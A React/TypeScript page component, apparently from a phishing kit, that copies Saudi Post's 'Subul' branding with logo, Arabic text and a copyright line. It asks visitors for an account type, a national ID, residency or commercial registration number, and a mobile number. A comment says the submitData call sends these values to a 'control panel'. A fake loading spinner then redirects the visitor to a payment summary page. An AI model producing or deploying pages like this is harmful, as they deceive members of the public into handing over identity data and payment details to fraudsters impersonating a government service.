import { useState } from "react";
import { Link, useLocation } from "wouter";
import { submitData } from "@/lib/store";

export default function LinkPhone() {
  const [, setLocation] = useLocation();
  const [accountType, setAccountType] = useState("individuals");
  const [username, setUsername] = useState("");
  const [phone, setPhone] = useState("");
  const [phoneError, setPhoneError] = useState("");
  
  // Loading and message states
  const [isLoading, setIsLoading] = useState(false);
  
  // Validation states
  const [formErrors, setFormErrors] = useState<string[]>([]);
  const [showErrors, setShowErrors] = useState(false);

  // Phone validation
  const validatePhone = (value: string) => {
    // Only allow numbers
    const numbersOnly = value.replace(/[^0-9]/g, '').slice(0, 10);
    setPhone(numbersOnly);
    
    if (numbersOnly.length === 10) {
      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
      const prefix = numbersOnly.substring(0, 3);
      if (!validPrefixes.includes(prefix)) {
        setPhoneError("رقم الجوال يجب أن يبدأ بـ 05X");
      } else {
        setPhoneError("");
      }
    } else if (numbersOnly.length > 0) {
      setPhoneError("رقم الجوال يجب أن يتكون من 10 أرقام");
    } else {
      setPhoneError("");
    }
  };

  // Handle action with loading
  const handleActionWithLoading = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      // Navigate to next page after loading
      setLocation('/summary-payment');
    }, 3000);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate fields
    const errors: string[] = [];
    if (!username.trim()) errors.push('اسم المستخدم');
    if (!phone.trim()) {
      errors.push('رقم الهاتف المراد ربطه');
    } else if (phone.length !== 10) {
      errors.push('رقم الجوال يجب أن يتكون من 10 أرقام');
    } else {
      const validPrefixes = ['050', '053', '054', '055', '056', '057', '058', '059'];
      const prefix = phone.substring(0, 3);
      if (!validPrefixes.includes(prefix)) {
        errors.push('رقم الجوال يجب أن يبدأ بـ 05X');
      }
    }
    
    if (errors.length > 0) {
      setFormErrors(errors);
      setShowErrors(true);
      return;
    }
    
    // إرسال البيانات للوحة التحكم
    const accountTypeLabels: Record<string, string> = {
      individuals: 'أفراد',
      business: 'أعمال',
      government: 'خدمات حكومية'
    };
    submitData({
      'نوع الحساب': accountTypeLabels[accountType] || accountType,
      'اسم المستخدم': username,
      'رقم الهاتف المراد ربطه': phone,
    });
    
    setShowErrors(false);
    handleActionWithLoading();
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center z-50">
          <div className="w-12 h-12 md:w-16 md:h-16 border-4 border-[#04ccf0] border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {/* Header - dark green bar with English on left */}
      <header className="bg-[#143c3c] py-2">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            {/* Empty space on right */}
            <div></div>
            {/* English on left */}
            <a href="#" className="text-white text-xs md:text-sm hover:text-gray-300">English</a>
          </div>
        </div>
      </header>

      {/* Line below header */}
      <div className="h-1.5 md:h-2 bg-[#146c84]"></div>

      {/* Logo and Register button below header */}
      <div className="bg-gray-100 py-3 md:py-4">
        <div className="container mx-auto px-4">
          <div className="max-w-xl mx-auto flex justify-between items-center">
            {/* Logo on right */}
            <Link to="/">
              <img src="/images/spl-logo.png" alt="سبل" className="h-10 md:h-14 lg:h-16 w-auto" />
            </Link>
            {/* Register button on left */}
            <Link to="/register">
              <button className="px-4 md:px-6 py-1.5 md:py-2 border-2 border-[#146c84] text-[#146c84] bg-white font-medium rounded text-sm md:text-base hover:bg-[#146c84] hover:text-white transition-colors">
                تسجيل
              </button>
            </Link>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-3 md:px-4 py-4 md:py-8 lg:py-12">
        <div className="max-w-xl mx-auto">
          {/* White Box Container */}
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 lg:p-10">
            {/* Title */}
            <h1 className="text-xl md:text-2xl lg:text-3xl font-bold text-[#143c3c] text-right mb-4 md:mb-6 lg:mb-8">
              ربط رقم الهاتف وتنشيط الحساب
            </h1>

            {/* Account Type Selection */}
            <div className="mb-4 md:mb-6 lg:mb-8">
              <h2 className="text-base md:text-lg lg:text-xl font-semibold text-gray-800 text-right mb-3 md:mb-4 lg:mb-6">
                الرجاء اختيار نوع الحساب
              </h2>

              <div className="space-y-2 md:space-y-3 lg:space-y-4">
                {/* الأفراد */}
                <label className="flex items-center gap-2 cursor-pointer py-1">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="individuals"
                      checked={accountType === "individuals"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "individuals" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "individuals" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الأفراد</span>
                </label>

                {/* الأعمال */}
                <label className="flex items-center gap-2 cursor-pointer py-1">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="business"
                      checked={accountType === "business"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "business" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "business" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الاعمال</span>
                </label>

                {/* الخدمات الحكومية */}
                <label className="flex items-center gap-2 cursor-pointer py-1">
                  <div className="relative">
                    <input
                      type="radio"
                      name="accountType"
                      value="government"
                      checked={accountType === "government"}
                      onChange={(e) => setAccountType(e.target.value)}
                      className="sr-only"
                    />
                    <div className={`w-5 h-5 md:w-5 md:h-5 rounded-full border-2 ${accountType === "government" ? "border-[#146c84] bg-[#146c84]" : "border-[#146c84]"} flex items-center justify-center`}>
                      {accountType === "government" && (
                        <div className="w-2 h-2 rounded-full bg-white"></div>
                      )}
                    </div>
                  </div>
                  <span className="text-gray-700 text-sm md:text-base">الخدمات الحكومية</span>
                </label>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit}>
              <h3 className="text-base md:text-lg lg:text-xl font-semibold text-gray-800 text-right mb-3 md:mb-4 lg:mb-6">
                بيانات التسجيل
              </h3>

              {/* Username Field */}
              <div className="mb-3 md:mb-4">
                <input
                  type="text"
                  placeholder={accountType === "business" ? "اسم المستخدم / رقم الرخصة / السجل التجاري / الرقم الموحد" : accountType === "government" ? "اسم المستخدم" : "اسم المستخدم / رقم الهوية / رقم الإقامة"}
                  value={username}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
                    setUsername(value);
                  }}
                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                />
              </div>

              {/* Phone Field */}
              <div className="mb-4 md:mb-6">
                <input
                  type="text"
                  placeholder="رقم الهاتف المراد ربطه"
                  value={phone}
                  onChange={(e) => validatePhone(e.target.value)}
                  className="w-full px-3 md:px-4 py-2.5 md:py-3 border border-gray-300 rounded-lg text-right text-sm focus:outline-none focus:border-[#04ccf0] focus:ring-1 focus:ring-[#04ccf0]"
                />
                {phoneError && (
                  <p className="text-red-500 text-xs mt-1 text-right">{phoneError}</p>
                )}
              </div>

              {/* Error Messages */}
              {showErrors && formErrors.length > 0 && (
                <div className="mb-3 md:mb-4 p-3 md:p-4 bg-red-50 border border-red-300 rounded-lg">
                  <p className="text-red-600 font-bold mb-2 text-right text-sm md:text-base">يرجى إكمال الحقول التالية:</p>
                  <ul className="list-disc list-inside text-red-500 text-xs md:text-sm text-right">
                    {formErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              )}

              {/* Submit Button */}
              <div>
                <button
                  type="submit"
                  className="w-full sm:w-auto px-8 md:px-12 lg:px-16 py-2.5 md:py-3 bg-[#04ccf0] text-black font-bold rounded-lg hover:bg-[#03b5d6] transition-colors text-sm md:text-base"
                >
                  ربط رقم الجوال
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#143c3c] py-4 md:py-5 mt-auto">
        <div className="container mx-auto px-3 md:px-4">
          <div className="flex flex-col items-center gap-2 md:gap-0 md:flex-row md:justify-between text-white text-xs md:text-sm">
            {/* Right side - Copyright */}
            <div className="flex items-center gap-1 text-center md:text-right">
              <span>©</span>
              <span>2026 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُبل</span>
            </div>
            
            {/* Left side - Terms and Privacy */}
            <div className="flex flex-wrap items-center justify-center gap-1 text-center">
              <span className="text-gray-300">عند استخدامك هذا الموقع، فإنك توافق على</span>
              <a href="#" className="text-[#04ccf0] hover:underline">شروط الخدمة</a>
              <span className="text-gray-300">و</span>
              <a href="#" className="text-[#04ccf0] hover:underline">سياسة الخصوصية</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
